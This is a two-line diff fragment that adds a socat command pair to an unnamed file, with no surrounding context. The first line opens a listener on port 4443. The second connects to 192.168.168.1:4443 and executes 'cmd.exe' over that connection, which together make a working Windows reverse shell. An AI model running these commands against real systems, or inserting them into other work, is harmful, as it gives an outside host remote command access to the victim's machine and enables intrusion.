@@ -1,0 +1,2 @@
+socat -d -d TCP4-LISTEN:4443 STDOUT
+TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes
